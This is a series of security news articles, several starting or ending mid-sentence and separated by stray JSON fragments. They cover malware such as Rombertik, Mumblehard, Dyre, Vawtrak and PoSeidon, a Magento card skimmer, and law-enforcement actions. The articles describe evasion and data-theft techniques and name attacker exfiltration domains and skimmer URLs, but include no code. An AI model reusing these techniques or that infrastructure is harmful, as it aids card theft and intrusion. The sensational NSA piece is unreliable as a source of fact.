Dubbed Rombertik, which is \"unique\" among other self-destructing malware samples due to its unique evasion techniques. As soon as any analysis tool is detected, Rombertik attempts to delete the device's Master Boot Record (MBR) and home directories, making the machine constantly restart. Rombertik is a complex piece of spyware designed to \"indiscriminately\" collect everything a user does online in order to obtain victim’s login credentials and other confidential information. Infects users via Phishing campaign: Rombertik typically gets installed on vulnerable machines when users click on malicious attachments included in phishing emails, Cisco security researchers Ben Baker and Alex Chiu said in a blog post Monday. Once loaded into the system, Rombertik first runs a series of anti-analysis checks to determine if it is running within a sandbox. In case it isn’t running within the sandbox, Rombertik decrypts and installs itself on the victim's machine, which then allows the malware to launch a second copy of itself and overwrite the second copy with the malware's core spying functionality. Here’s the kicker: After completing this process and before begins spying on users, Rombertik runs a final check to make sure it is not being analyzed in memory. In case it finds any indication of being analyzed, the spyware attempts to destroy the master boot record (MBR) of the vulnerable computer. Rombertik then restarts the machine, and because now the MBR is missing from the hard drive, the victim’s computer will go into an endless restart loop. MBR is the first sector of a computer’s hard drive that the system looks for before loading the operating system. However, deleting or destroying MBR involves re-installing of operating system, which means valuable data is lost. In cases where the malware is under the microscope of security experts or any rival malware author, Rombertik will self-destruct itself, taking the contents of a victim's hard drive along with it. Security researchers reverse-engineered the malware and found that Rombertik contains volumes of \"garbage code\" that have to be analyzed. The researchers were able to capture a small sample and found that… ...the unpacked Rombertik sample was 28KB in size while the packed version is 1264KB, including 75 images and 8,000 functions that are never used. Rombertik other Tricks involve: Moreover, Rombertik keeps itself in sandboxes by writing a random byte of data to memory 960 million times in an effort to overwhelm analysis tools that try to detect malware by logging system activity. \"If an analysis tool attempted to log all of the 960 million write instructions, the log would grow to over 100 gigabytes,\" researchers explained in a blog post. \"Even if the analysis environment was capable of handling a log that large, it would take over 25 minutes just to write that much data to a typical hard drive. This complicates the analysis.\" Data wiping and Self-destructing malware: Data wiping and self-destructing malware are not new. In last three years, we have seen a hike in malware evasion capabilities. Wiper malware was used against South Korean banks and TV broadcasters in 2013 as well as against Sony Pictures Entertainment last year, which marked history in a massive data breach. Also last year, the German Aerospace Centre was targeted by a self-destructive malware in an espionage attack, believed to be conducted by China. TIP The best way to keep your systems away from such malware is to have a best antivirus for PCs, as well as avoid opening malicious or suspicious links served via phishing emails." }

The new Linux malware, discovered by the security researchers from the antivirus provider Eset, has been dubbed \"Mumblehard\" because it is Muttering spam from your servers, says Eset 23-page long report (PDF) titled \"Unboxing Linux/Mumblehard.\" Researchers have logged more than 8,500 unique IP addresses during the seven months period of research that were hit by Mumblehard Linux malware and found over 3,000 machines joined them in the past three weeks. Mumblehard features two basic components: Backdoor Spamming daemon Both written in the Perl programming language and \"feature the same custom packer written in assembly language.\" The backdoor allows hackers to infiltrate into the system and control the command and control servers, and the Spamming daemon is a behind-the-scenes process that focuses on sending large batches of spam emails from the infected servers. The most worrying part of this campaign: The Mumblehard operators have been active for over five years, and perhaps even longer, without any disruption. \"Malware targeting Linux and [OpenBSD] servers [are] becoming more and more complex,\" Eset researchers wrote. \"The fact that the [malware creator] used a custom packer...is somewhat sophisticated.\" However, it isn't \"as complex as the Windigo Operation we documented in 2014. Nonetheless, it is worrying that the Mumblehard operators have been active for many years without disruption.\" Who is responsible for the spambot network? The Mumblehard Linux malware actually exploits vulnerabilities in WordPress and Joomla content management systems in order to get into the servers. Additionally, Mumblehard malware is also distributed by installing ‘pirated’ versions of a Linux and BSD program called DirectMailer, software developed by Yellsoft used for sending bulk e-mails and sold for $240 through the Russian firm's website. So, when a user installs the pirated version of DirectMailer software, the Mumblehard operators gets a backdoor to the user's server that allows hackers to send spam messages. How to prevent the threat? Web server administrators should check their servers for Mumblehard infections by looking for the so-called unwanted cronjob entries added by the malware in an attempt to activate the backdoor every 15-minute increments. The backdoor is generally located in the /var/tmp or /tmp folders. You can deactivate this backdoor by mounting the tmp directory with the noexec option." }

It isn't only assumptions; it could actually happen in real. A new hi-tech railway signalling system being tested in the United Kingdom could potentially be hacked by cyber criminals to cause oncoming trains to crash into one another at highest speeds, an Internet security expert has warned. The Loophole: The European Rail Traffic Management System, a new digital system that are designed to make train lines secure and safer… ...actually lack in security that could easily expose the systems to malware and allows malicious actors (like terrorists) to cause massacre around the UK. 'Nasty Accident is Waiting.' Internet security expert Professor David Stupple told the BBC that plans to replace old railway signal lights with new digital systems could expose the railway network to cyber attack, causing a \"nasty accident\" to happen involving terrorists as they could \"easily expose the new mainframe.\" \"It's the clever malware that actually alters the way the train will respond,\" Stupple said. \"So, it will perhaps tell the system the train is slowing down, when [it is] speeding up.\" However, Stupple acknowledged that the Government are not complacent because they are completely aware of the dangers of the dangerous impacts and \"they are worried about it.\" The Internet security expert at City University also outlined that the operators and the government ministers are working on more safer and better security measures in order to avoid the upcoming cyber threat. What could be the worse part? Stubble also highlighted the government's fears that the possible and the biggest threat of hacking could come from an insider. Yes, we talking about the Insider Threat. In most of the cases, the security systems are very well protected against the outside malicious hackers and cyber attacks, but the real danger could come from an insider rogue employee. \"The weakness is getting malware into the system by employees,\" the expert explained. \"Either because they are dissatisfied or being bribed or coerced.\" The in-charge of the new Train System respond: Network Rail, the in charge of the new train line upgrade that is expected to be completely operational by the 2020s, confirmed it has acknowledged the threat. This means the new upgradation to the train lines could be at risk of a security breach. \"We know that the risk (of a cyber attack) will increase as we continue to roll out [the] digital technology across the network,\" a spokesman for National Rail told the BBC. The spokesperson added that Network Rail will work closely with the government, the security operators, their partners and suppliers in the railway industry as well as the external cyber-security specialists to better understand the potential threat to the new systems." }

What’s the issue? A lawyer Matthew Campbell of the Pinnacle Law Firm in North Little Rock is representing Don Paul Bales, Rick Entmeier, and Wendall Sampson, current and former officers of the Fort Smith Police Department in the lawsuit since January 2014. The three whistleblowers exposed some frauds within the corrupt department, and, therefore, the police have illegally investigated them. \"Since July 2013, the plaintiffs have been the target of nearly two dozen various investigations, Campbell told the Northwest Arkansas Democrat Gazette. \"[This range] from accusations that they misspent FSPD funds to allegations that they were impugning the FSPD on Facebook.\" What happened? Campbell provided a blank hard drive to the department requesting an archive of internal emails and other data as evidence, according to court documents. However, when the police department returned his external hard drive back to him, he found it loaded with three well-known Trojans, including a backdoor and a password-sniffing keylogger. The worse part: After examination of the hard drive's file system, the lawyer’s security consultant, Geoff Mueller, discovered three distinct types of Windows PC malware installed in a specific folder, one named D:\\Bales Court Order. The Trojans are as follows: Win32:Zbot-AVH[Trj] – A password stealer and backdoor NSIS:Downloader-CC[Trj] – A tool that connects to attacker-controlled servers and downloads and installs more malicious programs to run Two instances of Win32Cycbot-NF[Trj] – A nasty software that opens a backdoor and gives attackers freedom on the infected computer Not only the hard disk contained all the Trojans in the same sub-folder and not in the root directory, but also these Trojans more likely believed to have been placed there intentionally with an aim to take command of Campbell's computer. All the three Trojans were designed to steal passwords, install malicious software and grant FSPD command and control access for the Campbell’s computer. Not just Trojans: Campbell also accuses the police department of deleting swathes of emails related to the case that could have been recovered, according to the motion for sanctions [PDF]. The discovery ordered requested the department to hand over all relevant internal emails, but instead handing it over, the department purged those emails from the system that could have been recovered and deleted emails that were previously provided in response to freedom of information requests, Campbell claimed. Now, the lawyer has requested the court to hold the police department in criminal contempt, and has asked for the heading judge to rule in the favor of his clients. However, the Fort Smith Police Department (FSPD) haven’t yet commented on the issue." }

However, E-commerce and financial sites stand first in the rundown of potential victims as they manage financial exchanges. The traditional way to target victims of e-commerce sites is to use targeted \"phishing\" attacks via social media and emails. But… …due to increased awareness among the people about the threat of phishing attacks, hackers have now discovered new way — by malvertising legitimate websites where people assume to be safe and secure. We know: Today, there are many ready-to-use e-commerce platforms available on the Internet that are very easy to install and manage and that too at no extra cost; 'Magento' is one of the most popular out of them. The most popular, the most targeted: Yes! Security researchers at Sucuri have found a malicious code inside the Magento e-commerce website that was intended to send all the data submitted by a customer amid checkout procedure to a third-party site, here \"soulmagic .biz .fozzyhost .com/add.\" Hackers have added 50 extra lines of code in the: app/code/core/Mage/Payment/Model/Method/Cc.php file inside the prepareSave() function, which you can see below: What actually happens behind the scene? Like most Magento sites, the site scanned by the researchers had a checkout form that asks for customers' credit card details. However, Magento encrypts this information and saves it, and sends it to the payment gateway in order to complete users' transaction. But, at the moment between the checkout form submission and encryption of the user's payment details when Magento handles customer's sensitive information in a plain text, the code injected by hackers send this unencrypted data to third-party address. Not only Magento sites are targeted: Researchers also found a very similar code being injected by hackers into the Joomla Donation extension in Joomla websites in order to send customers' credit card information to the hackers using \"java-e-shop .com/add.\" Moreover, all e-commerce solutions, including CMS, plugin, and extension, are equally susceptible to this kind of cyber attack in the event they request customers' credit card details directly on a site, instead of redirecting them to a payment gateway. Because: It's so easy for a hacker to add a few lines of malicious code in the legitimate code of the website in an effort to dump customer's sensitive details to a noxious third-party. However, customers of online store aren't the only target, either: \"When hackers manage to compromise an e-commerce site, the owners of the website can be robbed too,\" researchers at Sucuri wrote. There are a known number of cases where hackers replace the PayPal account of website owner with their own account. As a result, every time a customer buys something, the site owner would \"never receive the funds.\" The bottom line: Online Shoppers can protect themselves against this threat by following these steps: Don't enter your payment details on the websites that offer their own page. Instead prefer the sites that redirect you to a payment gateway provided by PayPal, payment gateway or bank to complete the transaction. Only use your Credit Cards with additional levels of authentication. Use payment cards that support additional security layers, like Visa 3-D Secure, or MasterCard SecureCode, or your bank's own 2FA service. Check the website for any security issue. This can be done by either surfing the Internet or simply check Google's SafeBrowsing information for the website using this link: http://www.google.com/safebrowsing/diagnostic?site=example.com, where example.com is the domain name of the site you want to check. Owners of E-commerce website can protect themselves against this threat by following these steps: Don't allow customers to process payment details on your site. Outsource the payments to trusted third-party service such as PayPal, Stripe or Google Wallet, so that if hackers compromise your site they cannot be able to steal your customers' credit card details. Use best practices with your website security, including strong and unique passwords for every element of your site, actively maintain and update your website firewall, and monitor your website for security issues. Be Proactive. If your website is hacked, get help immediately as you cannot put both your customers' money as well as your reputation at risk." }

What are Air-Gapped systems? Air-gapped systems are known to be the most safest and secure systems on the earth. These systems are isolated from the Internet or any other Internet-connected computers or external networks. Air-gapped systems are generally used in the critical situations that demand high security like in payment networks to process debit and credit card transactions, military networks, and in industrial control systems that operate critical infrastructure of the Nation. Why Air-Gapped? It is very difficult to siphon data from Air-Gapped systems because it requires a physical access to the target system or machine in order to do that and gaining physical access is possible only by using removable devices such as a firewire cable or a USB flash drive. Now: Since 2005, a Chinese Hacking Group has been spying dedicatedly on Governments, Companies & Journalists in Southeast Asia, India, & other countries, according to FireEye. In a 69-page technical report, FireEye said the Chinese cyber espionage operations went undetected for the last ten years, conducted by a team of highly skilled hackers, dubbed APT30 (Advanced Persistent Threat). Now here's the deal: The APT30 Group is particularly interested in stealing information related to: Regional Political Disputed Territories Military and Economic issues Media Organizations and journalists Political Developments in Southeast Asia and India \"APT30’s attempts to compromise journalists and media outlets could also be used to punish outlets that do not provide favorable coverage – for example, both the New York Times and Bloomberg have had trouble securing visas for journalists in wake of unfavorable corruption reporting,\", the report said. This isn't enough: The group has reportedly developed a number of secret hacking tools and backdoors [MILKMAID, ORANGEADE Droppers, CREAMSICLE Downloader, BACKBEND, GEMCUTTER Downloaders] over the period of last ten years and infected victims using Phishing and Social Engineering attacks. However, the Capability to infiltrating air gapped systems makes the APT30 hacking group more sophisticated in nature. In order to hack into an air-gapped computer, the group tricked their victims into downloading malware on their home computers. \"APT30 uses three pieces of malware [SHIPSHAPE, SPACESHIP, FLASHFLOOD] that are believed to have been designed to propagate to removable drives with the intent of eventually infecting and stealing data from computers located on air-gapped networks.\" The Malware, designed with worm-like capabilities, can infect removable drives such as USB sticks and hard drives. Those devices can transfer the malware if later plugged into the secure networks. TARGETED COUNTRIES The countries primarily targeted were: India Malaysia Vietnam Thailand South Korea Nepal Bhutan Philippines Singapore Saudi Arabia Indonesia Japan Brunei Myanmar Laos Cambodia The Government of China has consistently denied these claims, arguing \"cybercrime is a global problem.\"" }

The law enforcement agencies from the United States, United Kingdom and the European Union conducted a joint operation to get rid of the botnet across the globe and seized the command-and-control server that had been used to operate the nasty Beebone (also known as AAEH) botnet. What’s a Botnet? A botnet is a network of large number of computers compromised with malicious software and controlled surreptitiously by hackers without the knowledge of victims. Basically, a \"botnet\" is a hacker’s \"robot\" that does the malicious work directed by hackers. Hackers and Cyber Criminals have brushed up their hacking skills and started using Botnets as a cyber weapon to carry out multiple crimes such as DDoS attacks (distributed denial of service), mass spamming, advertising revenue manipulation, cyber espionage, mining bitcoins, surveillance etc. However, this is not first time we hear about a sophisticated botnet took down by law enforcement agencies. Just two months ago, law Enforcement took down Ramnit botnet, which infected over 3.2 Million computers worldwide, and last year the FBI and Europol torn down the GameOver Zeus botnet, although it came back a month after its took down. So, What’s new about Beebone Botnet? Beebone botnet is a downloader software (kind of botnet downloader) that installs other forms of malicious software, including ransomware and rootkits, onto victims' machines without their even consent. The size of the network it infected was not significant, but the operators managed to maintain control of the infected machines over the years by making Beebone botnet polymorphic in nature, so that it can update itself in order to avoid antivirus detection. Here’s the Kicker: Beebone botnet updates itself as many as 19 times a day which makes the malware slightly different threat from all the existing botnets as well as prevent botnet detection. Once infected, the machines was ordered to \"distribute malicious software, harvest users' credentials for online services, including banking services, and extort money from users by encrypting key files and then demanding payment in order to return the data to a readable state,\" the US Computer Emergency Response Team (US-CERT) said. 5 MILLION UNIQUE SAMPLES OF BEEBONE IN THE WILD Initial figures show: Beebone has infected over 12,000 computers, which seems to be a tiny number compared to other Zeus botnet infection in the past that infected millions of computers across the world. However, it is believed that there are many more to come. According to Europol, currently there are more than 5 Million unique samples of Beebone botnet in the wild, with over 205,000 samples taken from a total of 23,000 computer systems between 2013 and 2014. BEEBONE INFECTION WORLDWIDE The footprint of Beebone botnet is worldwide: Beebone infections spread across more than 195 countries. Most of the infections are reported in the United States, followed by Japan, India, and Taiwan, said Europol's Deputy Director of Operations, Wil van Gemert. What’s the best part? The Federal Bureau of Investigation (FBI) is currently working with other U.S. law enforcement agencies and Europol's European Cybercrime Centre (EC3), the Dutch National High Tech Crime Unit and the Joint Cybercrime Action Taskforce in order to combat Beebone. Why Botnets re-emerged after took down? The main reason, according to me, is that the author of the botnet did not get arrested. It really doesn't matter how many domains the law enforcement took down or how many sinkholes security researchers create if the attackers not arrested… ...nobody can stop criminals from building new Botnet from zero. Thus, I really appreciate the FBI effort to weed out GameOver Zeus botnet by announcing a reward of $3 Million for the information leading to the direct arrest or conviction of Evgeniy Mikhailovich Bogachev -- The alleged author of GameOver Zeus botnet that stole more than $100 Million from bank accounts." }

The Security Agency also asked its employees to watch Porn -- Yes! Porn and a lot of Porn. The Analysts and Terrorism experts employed by U.S. Intelligence Agencies including the NSA and the CIA (Central Intelligence Agency) are tasked to watch graphic videos all day long. According to the recent report by Daily Beast, the Graphic video contents containing ISIS prisoner beheading, attacks on U.S. military forces, and sometimes sexual abuse of children are gathered from the computers and smartphones of captured or killed terrorists, and from websites frequented visited by jihadists. WHY NSA IS WATCHING PORN? Islamic State (Isis) and Al-Qaeda terrorists are using Reddit, eBay and pornography to send coded messages to their followers. Israeli Intelligence Agency noticed that Terrorists are using steganography technique to hide secret messages or content within an image or video file in order to keep their plans hidden from law enforcement and Intelligence agencies. However, the cyber security experts and data forensic teams sitting at NSA and CIA examine these graphical images and porn videos in an effort to gain clues that could help them track down the perpetrators, rescue hostages, or stop terrorist attacks on countries. The graphic videos believes to be retrieved by the NSA's Tailored Access Office (TAO) secret hacking unit, which works with CIA and FBI to develop and spread sophisticated computer spy software and network spy software worldwide to conduct automatic surveillance. TAO Unit reportedly infected more than 50,000 computer networks worldwide with malware designed to steal sensitive information and, last year it was revealed that the unit had intercepted Microsoft Windows crash error reports, which gave them all kinds of information about your system. NSA’s PORN ROOM: ANALYSTS, PSYCHOLOGISTS, THERAPISTS According to the Wall Street Journal, Thirty million Americans regularly watch porn online, and NSA employees are proudly one of them. \"It’s mostly porn,\" a former intelligence officer, who worked on counterterrorism operations, told The Daily Beast. \"In another context, a dedicated 'porn room' might be the greatest office park imaginable. But watching hours of the stuff becomes monotonous.\" Checking every image and watching every second of the graphic video for a whole day long actually becomes difficult for some analysts, as the work can take an \"extraordinary toll\" on their emotional state of mind. And to cope up with this issue, the Intelligence agencies have employed specialist psychologists and therapists. AT THE TIME WHEN NSA ENJOYED WATCHING NUDE PICS Especially when it comes to pornography, we know that NSA employees enjoy watching and passing nude photographs of people in \"sexually compromising\" situations among other employees, former NSA contractor Edward Snowden revealed last year. Also last year, an operation dubbed \"Optic Nerve\" showed the ugly face of the Intelligence agencies that allegedly captured and stored nude images and other sensitive data from webcam chats of nearly 1.8 Millions of unsuspecting Yahoo users, which was the great assault on users’ privacy. At the agencies, watching porn videos and other graphical material to figure out the content behind it is a part of job for the analysts. Obviously, the graphical content may or may not contain the clues about terrorists, but they have to watch all of them, and this is what they are getting paid for. NSA CHIEF DEFENDED U.S. SURVEILLANCE These efforts by the security agencies to leave no stone unturned is the reason why the Chief of NSA, General Keith Alexander defended US surveillance programs as part of a Noble Mission to protect the nation against terrorist attacks. No doubt, the analysts sometimes feel oppressed and become angry, but the agency claims that it \"deeply values the health and wellness of our [NSA & CIA] employees and provides a range of comprehensive services to address their needs.\" \"The NSA has long offered psychological consultation and intervention services to support our employees' important work against today's increasingly complex global threats,\" NSA spokesperson Vanee Vines said in a statement. TERRORISTS STARTED ADOPTING STRONG ENCRYPTION However, keeping in mind the out datedness of Steganography technology, I do not think that terrorists are still using the technology to communicate, when they have so many end-to-end encrypted messaging apps readily available out there. Last year, we also reported that the infamous terrorist group, Al-Qaeda, had started using strongest encryption techniques in order to bypass the standard cryptographic protections in its various communications. So, it is hard to believe that after the revelation of NSA’s mass surveillance programs by the agency’s cyber security specialist Snowden, terrorists communicate via an outdated technology. JOHN OLIVER INTERVIEW WITH SNOWDEN:- ABOUT \"DICK-PIC\" On Sunday's edition of Last Week Tonight, John Oliver interviewed NSA whistleblower Edward Snowden in Moscow. The conversation went half serious, half humorous when Snowden was asked, \"Can the government secretly access Americans' naked selfies?\" Snowden said, Yes! Oliver showed Snowden that when the New Yorkers were asked about Snowden and his work, they barely had an answer, which means most of the people in U.S. are actually not aware of NSA’s surveillance program. But, when the interviewer asked the New Yorkers about the government spying on their \"Dick Pics,\" they were far more concerned. However, Snowden says, \"The good news is there's no program named the Dick-Pic Program.\"" }

A MIXTURE OF MALWARE, SOCIAL ENGINEERING & DDoS Nowadays, cybercriminals not only rely on banking Trojans to harvest financial credentials, but also using sophisticated social engineering tactics to attack big corporations that frequently conduct wire transfers to move large sums. \"An experienced and resource-backed [cyber criminal] gang operates Dyre,\" John Kuhn, Senior Threat Researcher at IBM Managed Security Service, wrote in a blog post published Thursday. \"[Dyre] was used in wide-stroke [cyber] attacks for the past year and has now moved into a more [indecent] stage of attacking corporate accounts via the incorporation of skilled social engineering schemes.\" In addition to the advanced social engineering tricks, the Dyre criminal gang also employs distributed denial-of-service (DDoS) attacks against the targeted bank or businesses in order to distract attention and resources from the theft and to prevent victims from logging into the bank account until it was too late. HOW THE ATTACK WORKS The attack starts with a spear phishing email reaches into your organization with an attachment claiming to be a document of financial importance, like an invoice, but is actually an 'Upatre downloader'. Once opened, Upatre downloads and executes the Dyre Trojan into the victim's system which, according to IBM researchers, went undetected by the majority of antivirus software programs. Dry Trojan has capability to hijack victim's address book and send out mass emails to all of them via Outlook. The malware then monitors victim's activities and waits for further action. The process gets interesting when the victim with an infected computer tries to log into one of the hundreds bank sites which the trojan is programmed to monitor, Dyre displays new screen with a message stating that the site is experiencing some issues and that you must call the number provided to make the transaction. Once you call the number given, you’ll assisted by a real person, not an automated one. This is the uniqueness and the extent of social engineering trick used by Dyre attackers that use real persons as the part of their attack. The attackers then retrieve all the information from the victim, and as soon as the victim hangs up the phone, the wire transfer is made by the crooks on the other end of the phone. At the time, when the money is being bounced from bank to bank to circumvent detection by the bank and law enforcement, the targeted organization's website will be subjected to a DDoS attack. The idea behind the DDoS attack is to prevent the victim from accessing the bank account. STEPS TO PROTECT AGAINST THE DYRE WOLF IBM security researchers recommend the following steps to users in order to protect against the attack: Organizations should train its employees on security best practices. Conduct periodic mock phishing exercises where employees receive emails or attachments that simulate a malicious behavior. Then using that findings, discuss the growing security threats with them. Provide security trainings to its employees in order to help understand threats and measures they can take to protect their organization. Regular reminders on phishing and spam campaigns should be provided to employees in order to prevent them to open any suspicious attachments or links. As the banks never ask for banking credentials, employees should be trained to never provide this information to anyone. The Dyre Wolf campaign has already ripped off organizations for $500,000 (€450,000) and more than $1 Million (€910,000) per attack. However, this much large sums of money are not transferred without alarming the organizations, but cybercriminals have focused only on those banks that transfer large sums of money without triggering alarms." }

The researcher, Jakub Kroustek from AVG anti-virus firm, has provided an in-depth analysis (PDF) on the new and complex set of features of the malware which is considered to be one of the most dangerous threats in existence. Vawtrak is a sophisticated piece of malware in terms of supported features. It is capable of stealing financial information and executing transactions from the compromised computer remotely without leaving traces. The features include videos and screenshots capturing and launching man-in-the-middle attacks. HOW VAWTRAK SPREADS ? AVG anti-virus firm is warning users that it has discovered an ongoing campaign delivering Vawtrak to gain access to bank accounts visited by the victim and using the infamous Pony module in order to steal a wide range of victims’ login credentials. The Vawtrak Banking Trojan spreads by using one of the three ways: Drive-by download – spam email attachments or links to compromised sites Malware downloader – like Zemot or Chaintor Exploit kit – like as Angler Exploit Kit LATEST FEATURES According to the researcher, Vawtrak is using the Tor2Web proxy to receive updates from its developers. \"Of particular interest from a security standpoint is that by using Tor2web proxy, it can access update servers that are hosted on the Tor hidden web services without installing specialist software such as Torbrowser,\" Kroustek says. \"Moreover, the communication with the remote server is done over SSL, which adds further encryption.\" The latest Vawtrak sample uses steganography to hide update files within favicons in order to conceal the malicious downloads. Favicons are the small images used by the websites to add icon to website bookmarks and browser tabs. Once executed in the victim’s machine, Vawtrak performs the following actions: Disables antivirus protection. Inject custom code in a user-displayed web pages (this is mostly related to online banking) Steals passwords, digital certificates, browser history, and cookies. Surveillance of the victim (key logging, taking screenshots, capturing video) Creates a remote access to a user’s machine (VNC, SOCKS) Automatic updating. Vawtrak supports three major browsers to operate in – Internet Explorer, Firefox, and Chrome. It also supports password stealing from the other browsers. AFFECTED COUNTRIES Based on their statistics, Vawktrak is infecting banking, gaming and social network users mainly across the countries including United Kingdom, the United States, and Germany. Although, users in Australia, New Zealand, and across Europe are also affected. AVG concluded following their analysis of the malware that \"Vawtrak is like a Swiss Army knife for its operators because of its wide range of applications and available features.\"" }

The Point-of-Sale malware, dubbed \"PoSeidon\", is designed in a way that it has the capabilities of both the infamous Zeus banking Trojan and BlackPOS malware which robbed Millions from US giant retailers, Target in 2013 and Home Depot in 2014. PoSeidon malware scrapes memory from Point of Sale terminals to search for card number sequences of principal card issuers like Visa, MasterCard, AMEX and Discover, and goes on using the Luhn algorithm to verify that credit or debit card numbers are valid. The malware then siphon the captured credit card data off to Russian (.ru) domains for harvesting and likely resale, the researchers say. \"PoSeidon is another in the growing number of malware targeting POS systems that demonstrate the sophisticated techniques and approaches of malware authors,\" researchers of Cisco’s Security Solutions team wrote in a blog post. \"Attackers will continue to target POS systems and employ various obfuscation techniques in an attempt to avoid detection. As long as POS attacks continue to provide returns, attackers will continue to invest in innovation and development of new malware families.\" The components of PoSeidon are illustrated in the diagram above. Poseidon Point of Sale malware comprises of a Loader binary that maintains persistence on the target machine in an attempt to survive reboots and user logouts. The Loader then receives other components from the command and control servers. A subsequently downloaded binary FindStr installs a Keylogger component which scans the memory of the PoS device for credit card number sequences. The identified numbers are verified using the Luhn algorithm and then encrypted and sent to one of the given exfiltration servers, majority of which belongs to Russian domains: linturefa.com xablopefgr.com tabidzuwek.com lacdileftre.ru tabidzuwek.com xablopefgr.com lacdileftre.ru weksrubaz.ru linturefa.ru mifastubiv.ru xablopefgr.ru tabidzuwek.ru In past few years, a number of Point of Sale malware has been spotted in the United States, collecting users' credit card magnetic stripe data, and selling them in underground black markets.

Xiaomi, which is also known as Apple of China, provides an affordable and in-budget smartphones with almost all features that an excellent smartphone provides. On 5th March, when Bluebox researchers claimed to have discovered some critical flaws in Mi4 LTE smartphone, Xiaomi issued a statement to The Hacker News claiming that \"There are glaring inaccuracies in the Bluebox blog post\" and that they are investigating the matter. RESEARCHERS GET TROLLED BY CHINESE SELLERS Now, Xiaomi responded to Bluebox Labs by preparing a lengthy denial to their claims and said the new Mi4 smartphone purchased by Bluebox team in China (known as the birthplace of fake smartphones) was not an original Xiaomi smartphone but a counterfeit product. \"We have concluded our investigation on this topic — the device Bluebox obtained is 100% proven to be a counterfeit product purchased through an unofficial channel on the streets in China,\" Xiaomi spokesperson told The Hacker News in an email statement. \"It is therefore not an original Xiaomi product and it is not running official Xiaomi software, as Bluebox has also confirmed in their updated blog post.\" This means, Mi4 LTE smartphone owned by Bluebox are tempered by the local Chinese shops itself. What the Heck! Chinese get trolled by Chinese. XIAOMI DECLINES BLUEBOX CLAIMS Xiaomi provided a detailed step-by-step explanation on each and every fact and figure: Hardware: Xiaomi hardware experts have analysed the internal device photos provided to the company by Bluebox and confirmed that the physical hardware is markedly different from the original Mi 4 smartphone. IMEI number: Xiaomi after-sales team has confirmed that the IMEI on the device from Bluebox is a cloned IMEI number which has been previously used on other counterfeit Xiaomi devices in China. Software: Xiaomi MIUI team has also confirmed that the software installed on the device from Bluebox is not an official Xiaomi MIUI build. The company assured its customers that their devices neither come rooted, nor have any malware pre-installed. Contrary to Bluebox claims, the company also assured its customers that the MIUI used in their products is true Android, which means MIUI follows exact Google's Android CDD (Compatibility Definition Document), and passes all Android CTS tests to make sure a given device is fully Android compatible. Declining to Bluebox finding, Xiaomi released the following statement in an email to The Hacker News: As this device is not an original Xiaomi product, and not running an official Xiaomi MIUI software build, Bluebox’s findings are completely inaccurate and not representative of Xiaomi devices. We believe Bluebox jumped to a conclusion too quickly without a fully comprehensive investigation (for example, they did not initially follow our published hardware verification process correctly due to language barrier) and their attempts to contact Xiaomi were inadequate, considering the severity of their accusations. With the large parallel street market for mobile phones in China, there exists counterfeit products that are almost indistinguishable on the outside. This happens across all brands, affecting both Chinese and foreign smartphone companies selling in China. Furthermore, \"entrepreneurial\" retailers may add malware and adware to these devices, and even go to the extent of pre-installing modified copies of popular benchmarking software such as CPU-Z and Antutu, which will run \"tests\" showing the hardware is legitimate. Xiaomi takes all necessary measures to crack down on the manufacturers of fake devices or anyone who tampers with our software, supported by all levels of law enforcement agencies in China." }

The arrested hackers also include alleged hackers suspected of being behind attacks on Yahoo, the US Department of Defence (DoD), and PlayStation. The list of hackers arrested in the operation is given below: A 23-year-old man was allegedly responsible for breaching a satellite communications system used by the US Department of Defense. The hacker accessed 'non-confidential contact information' of almost 800 users, including name, title, e-mail addresses and phone numbers and gained control over information from 34,400 devices, including IMEI numbers. Another 21-year-old London man was arrested who is suspected of being an alleged member of the D33ds Company hacking collective, the group that hacked into Yahoo in 2012 and posted as many as 450,000 email addresses and passwords online. An alleged member of the Lizard Squad, the infamous hacking group which claimed the responsibility for taking down the Xbox Live and PlayStation networks over Christmas, was arrested in Leeds, Yorkshire, BBC reports. Lizard Squad member is believed to be 16-year-old teenager who was also behind the attacks on as many as 350 websites, including Lenovo. A 20-year-old man from Hackney, London was arrested on suspicion of committing a £15,000 phishing attack. A 22-year-old was apprehended on suspicion of developing and distributing malware. Many more suspects were arrested among above; you can read the NCA's full list of arrests here. \"The 56 arrests around the country this week are a result of the essential partnership activity with law enforcement, industry and government that is at the heart of fighting cybercrime,\" said Andy Archibald, Deputy Director of the NCA's National Cyber Crime Unit. \"Criminals need to realise that committing crime online will not make them anonymous to law enforcement. We are continuously working to track down and apprehend those seeking to utilise computers for criminal ends, and to disrupt the technical networks and infrastructures supporting international cyber crime.\" This is't first time when law-enforcement agencies have conducted such massive raids in cyber crimes cases. Last year, the Federal Bureau of Investigation (FBI) also conducted a massive raids in Europe and Australia, and arrested more than 100 customers of Blackshades Remote Administration Tool (RAT) malware. Blackshades and other malware like it allows hackers to remotely control victims' computers, turning on webcams, stealing usernames and passwords for email and Web services, personal information, and launching further attacks on other computers, without the knowledge of the computer owner. The malicious program modifies itself in such a way that it evade detection from the computer's antivirus software. Blackshades has been sold via PayPal and underground forums since at least 2010, which cost as little as $40. However, the recent raids carried out by NCA didn't just target hackers behind well-known attacks or specific cyber crime. Instead it has arrested hackers behind phishing attacks, malware, and also companies that offered web hosting to known criminals. 'Strike week' also suggests that the agencies was monitoring each and every activity of cyber crimes as well as hackers and collecting strong evidences against them. Using that information, the officials raided and arrested a long list of cyber criminals." }

A powerful piece of surveillance malware, known as \"Casper,\" has recently been discovered by the Canadian security researchers that once again point fingers at the French government. CASPER SURVEILLANCE MALWARE LINKED TO FRANCE The newly discovered sophisticated Casper surveillance malware is believed to be developed by France based hacking group suspected to have ties with the French government, according to the report published by Motherboard. Report suggests that French hacking group have developed ‘Swiss Army knife of spying tools’ which has been used by French government to conduct multiple espionage campaigns over the last few years. WHAT IS CASPER ? Casper is a ‘recognition tool’, designed to profile its targets and determine whether the victim is of interest for further surveillance or not. Casper surveillance malware was used as an initial program before deploying any advance persistent malware into the targeted computers for espionage purpose. In April 2014, Casper surveillance malware was especially hosted on a hacked Syrian Government‘s Ministry of Justice website to infect its targets by exploiting two Flash Player zero-day vulnerabilities that were not known publicly at that time. Syrian Ministry of Justice website which was set up in 2011 by the government for citizens to send complaints to the Bashar al-Assad regime. Casper malware was hosted in a folder on the website and users who accessed that folder were infected by the surveillance malware. These kind of zero-day exploits, in some way, open doors for hackers to collect information from the target computers and cost Millions of Dollars in exploit market. It is believed that Casper surveillance malware is created by experts with significant financial resources i.e. State-sponsored. BABAR, CASPER — SAME MALWARE FAMILY — SAME FATHER After analyzing the code fragments of a Casper malware, researchers found numerous similarities between Casper surveillance malware and the Babar. Babar, is an advance malware developed in 2009, capable of 